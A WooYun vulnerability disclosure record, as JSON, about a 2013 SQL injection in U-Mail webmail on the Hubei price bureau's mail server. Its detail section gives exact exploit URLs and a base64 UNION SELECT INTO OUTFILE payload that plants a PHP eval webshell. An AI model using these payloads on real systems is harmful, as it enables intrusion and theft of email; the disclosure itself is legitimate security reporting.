{"id": 6963, "wybug_id": "wooyun-2013-043492", "wybug_title": "湖北省物价局邮件系统注入导致任意代码执行漏洞", "wybug_corp": "湖北省物价局", "wybug_author": "西毒", "wybug_date": "2013-11-20 16:44", "wybug_open_date": "2014-01-04 16:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-04：\t细节向公众公开  简要描述： 湖北省物价局邮件系统注入导致任意代码执行漏洞 详细说明：  由于系统采用的是第三方邮件系统u-mail在u-mail其中一个文件由于参数过滤不严谨导致产生SQL注入...通过构造好的注入语句，以及报错出来的路径，通过base64编码然后直接可以写入webshell到web服务器当中，从而威胁到整个邮件服务器，严重会导致邮件服务器里面敏感邮件泄露，如：邮件内容、邮件联系人、伪造邮件等等第一步  访问 http://mail.hbpic.gov.cn/webmail/userapply.php?execadd=333&DomainID=111 即可爆出邮件系统的web路径\n\n第二步 访问 http://mail.hbpic.gov.cn/webmail/fileshare.php?file=YWEnIHVuaW9uIHNlbGVjdCAxLDIsMyw0LDUsNiwnPD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4nLDgsOSwxMCwxMSwxMiwxMywxNCBpbnRvIG91dGZpbGUgJ0Q6L3VtYWlsL1dvcmxkQ2xpZW50L2h0bWwvMzYwLnBocCcj其中YWEnIHVuaW9uIHNlbGVjdCAxLDIsMyw0LDUsNiwnPD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4nLDgsOSwxMCwxMSwxMiwxMywxNCBpbnRvIG91dGZpbGUgJ0Q6L3VtYWlsL1dvcmxkQ2xpZW50L2h0bWwvMzYwLnBocCcj 为aa' union select 1,2,3,4,5,6,'<?php eval($_POST[cmd]);?>',8,9,10,11,12,13,14 into outfile 'D:/umail/WorldClient/html/360.php'#直接导致写shell如图\n\n第三  服务器上权限设置不当，其他敏感信息外泄 \n\n修复方案： 此类非开源邮件系统，无法进行很好的修复方案1、联系厂家进行修复2、采用专业的web应用防火墙进行防护此类漏洞严重会导致邮件服务器里面敏感邮件泄露，如：邮件内容、邮件联系人、伪造邮件等等   漏洞证明：  如图 \n\n\n\n   修复方案：  修复方案： 此类非开源邮件系统，无法进行很好的修复方案1、联系厂家进行修复2、采用专业的web应用防火墙进行防护此类漏洞严重会导致邮件服务器里面敏感邮件泄露，如：邮件内容、邮件联系人、伪造邮件等等   版权声明：转载请注明来源 西毒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-11-24 21:53 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}